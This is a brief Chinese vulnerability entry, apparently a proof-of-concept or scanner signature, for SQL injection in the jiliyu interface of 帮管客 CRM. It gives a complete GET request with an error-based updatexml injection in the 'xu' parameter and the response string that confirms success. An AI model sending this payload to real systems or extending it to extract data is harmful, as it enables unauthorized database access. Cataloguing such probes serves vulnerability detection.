# 帮管客CRMjiliyu接口SQL注入漏洞

帮管客CRMjiliyu接口 ｜ SQL注入 ｜ —
- **请求**：`GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=123&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)) HTTP/1.1`
- **响应特征**：200 a0b923820dcc509a